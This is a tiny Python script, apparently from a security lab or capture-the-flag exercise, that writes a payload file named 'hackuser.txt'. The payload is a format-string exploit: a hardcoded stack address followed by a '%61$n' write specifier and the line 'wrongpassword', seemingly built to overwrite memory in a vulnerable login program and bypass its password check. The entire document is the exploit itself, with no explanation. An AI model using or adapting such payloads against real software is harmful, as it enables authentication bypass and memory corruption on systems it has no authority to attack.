
outstr = b'\x80\xcd\xff\xff'
fout = open("hackuser.txt", "wb")
fout.write(outstr)
fout.write("%61$n\nwrongpassword\n".encode('ascii'))
fout.close()
